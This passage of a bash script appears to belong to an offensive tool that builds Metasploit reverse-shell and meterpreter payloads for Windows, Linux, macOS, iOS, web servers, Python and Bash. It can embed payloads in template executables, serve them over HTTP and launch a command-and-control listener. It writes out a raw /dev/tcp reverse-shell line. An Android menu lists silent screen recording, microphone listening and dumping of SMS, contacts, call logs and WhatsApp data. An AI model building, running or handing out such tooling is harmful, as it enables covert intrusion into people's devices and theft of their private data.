    echo -e "  ${GREEN}[6]${NC}  Install APK"
    echo -e "  ${GREEN}[7]${NC}  Uninstall App"
    echo -e "  ${GREEN}[8]${NC}  Download File/Folder"
    echo -e "  ${GREEN}[9]${NC}  Send File/Folder"
    echo -e "  ${GREEN}[10]${NC} Run an App"
    echo -e "  ${GREEN}[11]${NC} Access Device Shell"
    echo -e "  ${GREEN}[12]${NC} Send SMS"
    echo -e "  ${GREEN}[13]${NC} Copy WhatsApp Data"
    echo -e "  ${GREEN}[14]${NC} Copy All Screenshots"
    echo -e "  ${GREEN}[15]${NC} Copy All Camera Photos"
    echo -e "  ${GREEN}[16]${NC} Anonymous Screenshot (silent)"
    echo -e "  ${GREEN}[17]${NC} Anonymous Screen Record (silent)"
    echo -e "  ${GREEN}[18]${NC} Open URL on Device"
    echo -e "  ${GREEN}[19]${NC} Display Photo on Device"
    echo -e "  ${GREEN}[20]${NC} Play Audio on Device"
    echo -e "  ${GREEN}[21]${NC} Play Video on Device"
    echo -e "  ${GREEN}[22]${NC} Get Device Information"
    echo -e "  ${GREEN}[23]${NC} Get Battery Information"
    echo -e "  ${GREEN}[24]${NC} Restart Device"
    echo -e "  ${GREEN}[25]${NC} Lock Device"
    echo -e "  ${GREEN}[26]${NC} Unlock Device"
    echo -e "  ${GREEN}[27]${NC} Dump All SMS"
    echo -e "  ${GREEN}[28]${NC} Dump All Contacts"
    echo -e "  ${GREEN}[29]${NC} Dump Call Logs"
    echo -e "  ${GREEN}[30]${NC} Record Mic Audio"
    echo -e "  ${GREEN}[31]${NC} Listen Mic Audio"
    echo -e "  ${GREEN}[32]${NC} Record Device Audio"
    echo -e "  ${GREEN}[33]${NC} WiFi Status Dump"
    echo -e "  ${GREEN}[34]${NC} Saved WiFi Networks"
    echo -e "  ${GREEN}[35]${NC} Network Snapshot"
    echo -e "  ${GREEN}[36]${NC} TCP Port Forward/Reverse"
    echo -e "  ${GREEN}[37]${NC} Force Stop App"
    echo -e "  ${GREEN}[38]${NC} Clear App Data"
    echo -e "  ${GREEN}[39]${NC} Grant/Revoke Permission"
    echo -e "  ${GREEN}[40]${NC} Use Keycodes (Control Device)"
    echo -e "  ${GREEN}[41]${NC} Ping Connectivity"
    echo ""
    
    echo "[$(date)] ANDROID-CONTROL | LHOST=$LHOST LPORT=$LPORT | FILE=$FILENAME | SIZE=$SIZE" >> "$SESSION_FILE"
  else
    echo -e "${RED}[FAIL] Failed to generate APK${NC}"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

#======================[ OTHER GENERATORS (unchanged) ]======================

generate_windows() {
  clear
  banner
  echo -e "${BLUE}[*] Generating Windows Payload...${NC}"
  
  echo -e "${YELLOW}[?] Select architecture:${NC}"
  echo -e "  ${GREEN}[1]${NC} x86 (32-bit)"
  echo -e "  ${GREEN}[2]${NC} x64 (64-bit)"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  
  echo -e "${YELLOW}[?] Payload type:${NC}"
  echo -e "  ${GREEN}[1]${NC} Meterpreter Reverse TCP (Staged)"
  echo -e "  ${GREEN}[2]${NC} Shell Reverse TCP (Stageless)"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" type
  
  if [ "$arch" == "2" ]; then
    ARCH_PAYLOAD="windows/x64"
  else
    ARCH_PAYLOAD="windows"
  fi
  
  if [ "$type" == "2" ]; then
    PAYLOAD_TYPE="shell_reverse_tcp"
  else
    PAYLOAD_TYPE="meterpreter/reverse_tcp"
  fi
  
  FILENAME="windows_payload_$(date +%s).exe"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  echo -e "${YELLOW}[?] Use template executable? (y/n)${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" template_q
  
  if [[ "$template_q" == "y" ]]; then
    echo -e "${YELLOW}[?] Enter path to .exe template:${NC}"
    read -p "$(echo -e ${CYAN}"[>] Path: "${NC})" TEMPLATE_EXE
    if [ -f "$TEMPLATE_EXE" ]; then
      msfvenom -p ${ARCH_PAYLOAD}/${PAYLOAD_TYPE} LHOST=$LHOST LPORT=$LPORT -x "$TEMPLATE_EXE" -k -f exe -o "$OUTPUT" 2>/dev/null
    else
      echo -e "${RED}[!] Template not found. Generating without...${NC}"
      msfvenom -p ${ARCH_PAYLOAD}/${PAYLOAD_TYPE} LHOST=$LHOST LPORT=$LPORT -f exe -o "$OUTPUT" 2>/dev/null
    fi
  else
    msfvenom -p ${ARCH_PAYLOAD}/${PAYLOAD_TYPE} LHOST=$LHOST LPORT=$LPORT -f exe -o "$OUTPUT" 2>/dev/null
  fi

  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${BOLD}Transfer:${NC}"
    echo -e "${YELLOW}  cd $PAYLOAD_DIR && python3 -m http.server 8888${NC}"
    echo ""
    echo "[$(date)] WINDOWS | LHOST=$LHOST LPORT=$LPORT | ARCH=${ARCH_PAYLOAD} | FILE=$FILENAME | SIZE=$SIZE" >> "$SESSION_FILE"
  else
    echo -e "${RED}[FAIL] Payload generation FAILED!${NC}"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

generate_linux() {
  clear
  banner
  echo -e "${GREEN}[*] Generating Linux Payload...${NC}"
  
  echo -e "${YELLOW}[?] Select architecture:${NC}"
  echo -e "  ${GREEN}[1]${NC} x86 (32-bit)"
  echo -e "  ${GREEN}[2]${NC} x64 (64-bit)"
  echo -e "  ${GREEN}[3]${NC} ARM (Raspberry Pi/Android)"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  
  case $arch in
    1) payload="linux/x86/meterpreter/reverse_tcp"; ext="elf" ;;
    2) payload="linux/x64/meterpreter/reverse_tcp"; ext="elf" ;;
    3) payload="linux/armle/meterpreter/reverse_tcp"; ext="elf" ;;
    *) payload="linux/x86/meterpreter/reverse_tcp"; ext="elf" ;;
  esac
  
  FILENAME="linux_payload_$(date +%s).$ext"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  msfvenom -p $payload LHOST=$LHOST LPORT=$LPORT -f $ext -o "$OUTPUT" 2>/dev/null

  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    chmod +x "$OUTPUT"
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${BOLD}Transfer + Execute:${NC}"
    echo -e "${YELLOW}  cd $PAYLOAD_DIR && python3 -m http.server 8888${NC}"
    echo ""
    echo "[$(date)] LINUX | LHOST=$LHOST LPORT=$LPORT | ARCH=$arch | FILE=$FILENAME | SIZE=$SIZE" >> "$SESSION_FILE"
  else
    echo -e "${RED}[FAIL] Payload generation FAILED!${NC}"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

generate_macos() {
  clear
  banner
  echo -e "${MAGENTA}[*] Generating macOS Payload...${NC}"
  
  echo -e "${YELLOW}[?] Select architecture:${NC}"
  echo -e "  ${GREEN}[1]${NC} x86 (Intel)"
  echo -e "  ${GREEN}[2]${NC} x64 (Intel 64-bit)"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  
  if [ "$arch" == "1" ]; then
    payload="osx/x86/shell_reverse_tcp"
  else
    payload="osx/x64/meterpreter/reverse_tcp"
  fi
  
  FILENAME="macos_payload_$(date +%s).macho"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  msfvenom -p $payload LHOST=$LHOST LPORT=$LPORT -f macho -o "$OUTPUT" 2>/dev/null

  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    chmod +x "$OUTPUT"
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${BOLD}Transfer:${NC}"
    echo -e "${YELLOW}  cd $PAYLOAD_DIR && python3 -m http.server 8888${NC}"
    echo ""
    echo "[$(date)] MACOS | LHOST=$LHOST LPORT=$LPORT | FILE=$FILENAME | SIZE=$SIZE" >> "$SESSION_FILE"
  else
    echo -e "${RED}[FAIL] Payload generation FAILED!${NC}"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

generate_iphone() {
  clear
  banner
  echo -e "${CYAN}[*] Generating iOS/iPhone Payload...${NC}"
  echo -e "${YELLOW}[!] Note: iOS payloads require jailbroken devices${NC}"
  
  echo -e "${YELLOW}[?] Select payload:${NC}"
  echo -e "  ${GREEN}[1]${NC} iOS Meterpreter Reverse TCP (arm64)"
  echo -e "  ${GREEN}[2]${NC} iOS Shell Reverse TCP (armle)"
  echo -e "  ${GREEN}[3]${NC} iOS Meterpreter Reverse HTTPS (arm64)"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" ios_type
  
  case $ios_type in
    1) payload="apple_ios/aarch64/meterpreter/reverse_tcp"; ext="macho" ;;
    2) payload="apple_ios/armle/shell_reverse_tcp"; ext="macho" ;;
    3) payload="apple_ios/aarch64/meterpreter/reverse_https"; ext="macho" ;;
    *) payload="apple_ios/aarch64/meterpreter/reverse_tcp"; ext="macho" ;;
  esac
  
  FILENAME="iphone_payload_$(date +%s).$ext"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  msfvenom -p $payload LHOST=$LHOST LPORT=$LPORT -f $ext -o "$OUTPUT" 2>/dev/null

  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    chmod +x "$OUTPUT"
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${BOLD}Transfer:${NC}"
    echo -e "${YELLOW}  cd $PAYLOAD_DIR && python3 -m http.server 8888${NC}"
    echo ""
    echo "[$(date)] IOS | LHOST=$LHOST LPORT=$LPORT | TYPE=$ios_type | FILE=$FILENAME" >> "$SESSION_FILE"
  else
    echo -e "${RED}[FAIL] Payload generation FAILED!${NC}"
    msfvenom -p osx/arm64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f macho -o "$OUTPUT" 2>/dev/null
    if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
      echo -e "${GREEN}[OK] Fallback payload created${NC}"
    fi
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

generate_web() {
  clear
  banner
  echo -e "${YELLOW}[*] Generating Web Payloads...${NC}"
  
  echo -e "${YELLOW}[?] Select web platform:${NC}"
  echo -e "  ${GREEN}[1]${NC} PHP Reverse Shell"
  echo -e "  ${GREEN}[2]${NC} ASP Reverse Shell"
  echo -e "  ${GREEN}[3]${NC} JSP Reverse Shell"
  echo -e "  ${GREEN}[4]${NC} WAR Reverse Shell (Tomcat)"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" web_type
  
  case $web_type in
    1) payload="php/reverse_php"; ext="php" ;;
    2) payload="windows/meterpreter/reverse_tcp"; ext="asp" ;;
    3) payload="java/jsp_shell_reverse_tcp"; ext="jsp" ;;
    4) payload="java/meterpreter/reverse_tcp"; ext="war" ;;
    *) payload="php/reverse_php"; ext="php" ;;
  esac
  
  FILENAME="web_payload_$(date +%s).$ext"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  if [ "$ext" == "php" ]; then
    msfvenom -p $payload LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTPUT" 2>/dev/null
  else
    msfvenom -p $payload LHOST=$LHOST LPORT=$LPORT -f $ext -o "$OUTPUT" 2>/dev/null
  fi

  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    echo "[$(date)] WEB | LHOST=$LHOST LPORT=$LPORT | TYPE=$ext | FILE=$FILENAME" >> "$SESSION_FILE"
  else
    echo -e "${RED}[FAIL] Payload generation FAILED!${NC}"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

generate_python() {
  clear
  banner
  echo -e "${BLUE}[*] Generating Python Payload...${NC}"
  
  FILENAME="python_payload_$(date +%s).py"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  msfvenom -p python/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTPUT" 2>/dev/null

  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${BOLD}Run on target:${NC}"
    echo -e "${YELLOW}  python3 $FILENAME${NC}"
    echo ""
    echo "[$(date)] PYTHON | LHOST=$LHOST LPORT=$LPORT | FILE=$FILENAME" >> "$SESSION_FILE"
  else
    echo -e "${RED}[FAIL] Payload generation FAILED!${NC}"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

generate_bash() {
  clear
  banner
  echo -e "${GREEN}[*] Generating Bash Reverse Shell...${NC}"
  
  FILENAME="bash_payload_$(date +%s).sh"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  msfvenom -p cmd/unix/reverse_bash LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTPUT" 2>/dev/null

  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    chmod +x "$OUTPUT"
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${BOLD}Run on target (Linux/Unix):${NC}"
    echo -e "${YELLOW}  bash $FILENAME${NC}"
    echo ""
    echo "[$(date)] BASH | LHOST=$LHOST LPORT=$LPORT | FILE=$FILENAME" >> "$SESSION_FILE"
  else
    echo -e "${RED}[FAIL] Payload generation FAILED!${NC}"
    echo -e "${YELLOW}[!] Creating manual bash reverse shell...${NC}"
    cat > "$OUTPUT" << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
EOF
    sed -i "s/127.0.0.1/$LHOST/g; s/4444/$LPORT/g" "$OUTPUT"
    chmod +x "$OUTPUT"
    echo -e "${GREEN}[OK] Manual bash reverse shell created${NC}"
    echo "[$(date)] BASH | LHOST=$LHOST LPORT=$LPORT | FILE=$FILENAME" >> "$SESSION_FILE"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

#==============[ LISTENER ]==============

start_listener() {
  clear
  banner
  
  echo -e "${CYAN}╔═════════════════════════════════════════════╗${NC}"
  echo -e "${CYAN}║         ${WHITE}COMMAND & CONTROL LISTENER${CYAN}          ║${NC}"
  echo -e "${CYAN}╚═════════════════════════════════════════════╝${NC}"
  echo ""
  
  default_ip=$(get_ip)
  
  echo -e "${YELLOW}[?] Enter LHOST (Listener IP):${NC}"
  read -p "$(echo -e ${CYAN}"[>] LHOST (default: $default_ip): "${NC})" L_HOST
  L_HOST=${L_HOST:-$default_ip}
  
  echo -e "${YELLOW}[?] Enter LPORT (Listener Port):${NC}"
  read -p "$(echo -e ${CYAN}"[>] LPORT (default: 4444): "${NC})" L_PORT
  L_PORT=${L_PORT:-4444}
  
  echo ""
  echo -e "${YELLOW}[?] Select payload type for handler:${NC}"
  echo -e "  ${GREEN}[1]${NC} android/meterpreter/reverse_tcp"
  echo -e "  ${GREEN}[2]${NC} windows/meterpreter/reverse_tcp"
  echo -e "  ${GREEN}[3]${NC} linux/x64/meterpreter/reverse_tcp"
  echo -e "  ${GREEN}[4]${NC} osx/x64/meterpreter/reverse_tcp"
  echo -e "  ${GREEN}[5]${NC} apple_ios/aarch64/meterpreter/reverse_tcp"
  echo -e "  ${GREEN}[6]${NC} php/reverse_php"
  echo -e "  ${GREEN}[7]${NC} python/meterpreter/reverse_tcp"
  echo -e "  ${GREEN}[8]${NC} java/meterpreter/reverse_tcp"
  echo -e "  ${GREEN}[9]${NC} Custom payload"
  echo ""
  read -p "$(echo -e ${CYAN}"[>] Select [1-9]: "${NC})" handler_type
  
  case $handler_type in
    1) PAYLOAD="android/meterpreter/reverse_tcp" ;;
    2) PAYLOAD="windows/meterpreter/reverse_tcp" ;;
    3) PAYLOAD="linux/x64/meterpreter/reverse_tcp" ;;
    4) PAYLOAD="osx/x64/meterpreter/reverse_tcp" ;;
    5) PAYLOAD="apple_ios/aarch64/meterpreter/reverse_tcp" ;;
    6) PAYLOAD="php/reverse_php" ;;
    7) PAYLOAD="python/meterpreter/reverse_tcp" ;;
    8) PAYLOAD="java/meterpreter/reverse_tcp" ;;
    9) 
      echo -e "${YELLOW}[?] Enter custom payload:${NC}"
      read -p "$(echo -e ${CYAN}"[>] "${NC})" PAYLOAD
      PAYLOAD=${PAYLOAD:-"windows/meterpreter/reverse_tcp"}
      ;;
    *) PAYLOAD="windows/meterpreter/reverse_tcp" ;;
  esac
  
  echo ""
  echo -e "${GREEN}[+] Starting listener...${NC}"
  echo -e "${GREEN}[+] LHOST: $L_HOST | LPORT: $L_PORT | Payload: $PAYLOAD${NC}"
  echo ""
  echo -e "${RED}╔══════════════════════════════════════════════╗${NC}"
  echo -e "${RED}║  ${WHITE}Listener is running. Waiting for target...${RED}  ║${NC}"
  echo -e "${RED}║  ${YELLOW}Press Ctrl+C to stop listener${RED}           ║${NC}"
  echo -e "${RED}╚══════════════════════════════════════════════╝${NC}"
  echo ""
  
  RC_FILE="$HOME/.metaspotle/listener_${L_PORT}.rc"
  cat > "$RC_FILE" << EOF
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $L_HOST
set LPORT $L_PORT
set ExitOnSession false
set SessionTimeout 0
set AutoVerifySession true
set AutoSystemInfo true
set WaitForSession true
exploit -j -z
EOF

  echo -e "${GREEN}[*] Launching Metasploit Framework...${NC}"
  echo -e "${YELLOW}[*] Resource file: $RC_FILE${NC}"
  sleep 2
  
  msfconsole -q -r "$RC_FILE"
  
  echo ""
  echo -e "${YELLOW}[*] Listener stopped.${NC}"
  
  echo -e "${YELLOW}[?] Open interactive MSF console? (y/n)${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" open_msf
  if [[ "$open_msf" == "y" ]]; then
    echo -e "${GREEN}[*] Opening msfconsole... Type 'exit' to return${NC}"
    msfconsole -q
  fi
  
  read -p "$(echo -e ${DIM}"Press [Enter] to return to main menu...")"
}

#==============[ UTILITY FUNCTIONS ]==============

list_payloads() {
  clear
  banner
  echo -e "${GREEN}[*] Generated Payloads:${NC}"
  echo ""
  
  if [ -d "$PAYLOAD_DIR" ] && [ "$(ls -A $PAYLOAD_DIR 2>/dev/null)" ]; then
    ls -lh "$PAYLOAD_DIR" | tail -n +2
    echo ""
    echo -e "${BOLD}Total payloads: $(ls $PAYLOAD_DIR | wc -l)${NC}"
    echo -e "${BOLD}Total size: $(du -sh $PAYLOAD_DIR | cut -f1)${NC}"
    echo ""
    echo -e "${YELLOW}[*] To serve payloads over HTTP:${NC}"
    echo -e "${WHITE}  cd $PAYLOAD_DIR && python3 -m http.server 8888${NC}"
  else
    echo -e "${YELLOW}[!] No payloads generated yet.${NC}"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

view_sessions() {
  clear
  banner
  echo -e "${CYAN}[*] Session & Payload History:${NC}"
  echo ""
  
  if [ -f "$SESSION_FILE" ] && [ -s "$SESSION_FILE" ]; then
    cat "$SESSION_FILE"
    echo ""
    echo -e "${BOLD}Total entries: $(wc -l < $SESSION_FILE)${NC}"
  else
    echo -e "${YELLOW}[!] No session history yet.${NC}"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

clean_payloads() {
  clear
  banner
  echo -e "${RED}[!] Are you sure you want to delete all generated payloads? (y/n)${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" confirm
  
  if [[ "$confirm" == "y" ]]; then
    rm -f "$PAYLOAD_DIR"/*
    rm -rf "$TOOL_DIR"/*
    echo -e "${GREEN}[+] All payloads and tools deleted.${NC}"
  else
    echo -e "${YELLOW}[*] Cancelled.${NC}"
  fi
  
  sleep 1
}

#==============[ ENTRY POINT ]==============

clear
init_tracker
check_deps
main_menu
